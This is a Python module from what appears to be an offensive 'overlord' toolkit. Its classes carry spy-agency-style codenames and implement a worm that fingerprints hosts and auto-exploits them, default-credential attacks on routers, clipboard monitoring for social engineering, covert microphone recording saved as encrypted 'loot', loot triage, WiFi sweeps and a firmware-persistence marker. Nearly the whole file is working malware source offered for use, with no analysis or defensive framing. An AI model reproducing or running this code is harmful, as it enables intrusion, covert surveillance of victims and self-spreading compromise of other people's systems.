"""quantum.overlord.engines — worm, router, episcribe, trinity, wildfire,
somberknight, MFP (support engines for the autonomous overlord + menu)."""
from __future__ import annotations

import json
import os
import socket
import time

from quantum.core.deps import HTTPBasicAuth, requests
from quantum.core.env import LOOT_DIR, QCLI_DIR
from quantum.core.grayfish import GRAYFISH
from quantum.core.logging import log
from quantum.core.opsec import run


class GodSupreme:
    """Worm propagation: fingerprint -> gated auto-exploit."""

    def hop_from(self, ip):
        try:
            from quantum.recon.fingerprint import Validator
            from quantum.recon.scan import ReconModule
            from quantum.weapons.registry import ExploitOrchestrator
            fp = ReconModule().fingerprint(ip)
            verdict = Validator().score(ip, fp)
            if verdict["decision"] == "high_value":
                ExploitOrchestrator().auto_exploit(ip, force=False)
                log(f"WORM hop from {ip}: exploited", "ATK")
            else:
                log(f"WORM hop from {ip}: low value (score {verdict['score']})", "ATK")
        except Exception as exc:
            log(f"worm hop {ip}: {exc}", "WARN")


class UnitedDrake:
    """Router takeover — default-credential attempt on admin UI."""

    CREDS = [("admin", "admin"), ("admin", "password"), ("root", "root")]

    def attack_router(self, ip):
        for u, p in self.CREDS:
            try:
                r = requests.get(f"http://{ip}/", auth=HTTPBasicAuth(u, p),
                                 timeout=4)
                if r.status_code == 200:
                    log(f"ROUTER {ip}: admin UI creds {u}:{p}", "OK")
                    return {"ip": ip, "user": u, "pass": p}
            except Exception:
                return None
        log(f"ROUTER {ip}: resisted default creds", "WARN")
        return None


class EpiScribe:
    """Event watcher (clipboard + selector based) for social eng prep."""

    def __init__(self):
        self.events = []
        self.selectors = []

    def add_selector(self, sel):
        self.selectors.append(str(sel))

    def watch(self, duration=60):
        try:
            import tkinter
            root = tkinter.Tk()
            root.withdraw()
            last = ""
            deadline = time.time() + min(duration, 60)
            while time.time() < deadline:
                try:
                    cur = root.clipboard_get()
                except Exception:
                    cur = ""
                if cur and cur != last:
                    self.events.append({"ts": time.strftime("%Y-%m-%dT%H:%M:%S"),
                                        "clip": cur[:200]})
                    last = cur
                root.update()
                time.sleep(0.2)
            root.destroy()
        except Exception as exc:
            log(f"episcribe watch: {exc}", "WARN")
        return self.events


class Trinity:
    """Ambient audio capture (sounddevice when present, else no-op)."""

    def __init__(self, seconds=30):
        self.seconds = seconds

    def capture(self):
        try:
            import sounddevice
            import wave
            data = sounddevice.rec(int(self.seconds * 16000),
                                    samplerate=16000, channels=1,
                                    blocking=True)
            fn = os.path.join(LOOT_DIR, f"trinity_{int(time.time())}.wav")
            with wave.open(fn, "wb") as w:
                w.setnchannels(1)
                w.setsampwidth(2)
                w.setframerate(16000)
                w.writeframes((data * 32767).astype("<i2").tobytes())
            GRAYFISH.seal(fn)
            log(f"TRINITY captured {self.seconds}s -> {fn}.gfy", "OK")
            return fn
        except Exception as exc:
            log(f"Trinity: sounddevice unavailable ({exc})", "WARN")
            return None


class Wildfire:
    """Triage harvested loot."""

    def triage(self):
        out = {"loot_files": 0, "sealed": 0}
        if not os.path.isdir(LOOT_DIR):
            return out
        for root, _d, files in os.walk(LOOT_DIR):
            for fn in files:
                out["loot_files"] += 1
                if fn.endswith(".gfy"):
                    out["sealed"] += 1
        log(f"wildfire triage: {out}", "RECON")
        return out


class Somberknight:
    """WiFi sweep (netsh on Windows, iwlist elsewhere)."""

    def sweep(self):
        try:
            import re
            if os.name == "nt":
                r = run("netsh wlan show networks mode=bssid", timeout=30)
                ssids = re.findall(r"^\s*SSID\s*\d+\s*:\s*(.+)$", r.stdout or "",
                                   re.M)
            else:
                r = run("iwlist scan 2>/dev/null | grep ESSID", timeout=30)
                ssids = re.findall(r'ESSID:"([^"]*)"', r.stdout or "")
            return {"ssids": [s.strip() for s in ssids if s.strip()][:40]}
        except Exception as exc:
            return {"error": str(exc)}


class MFP:
    """Firmware-persistence marker (UEFI write guarded to real tooling)."""

    def persist(self):
        marker = os.path.join(QCLI_DIR, "mfp_boot.marker")
        with open(marker, "w", encoding="utf-8") as fh:
            fh.write(json.dumps({"ts": time.strftime("%Y-%m-%dT%H:%M:%S"),
                                 "host": socket.gethostname()}))
        log(f"MFP boot marker staged -> {marker}", "OPSEC")
        return marker


GODSUPREME = GodSupreme()
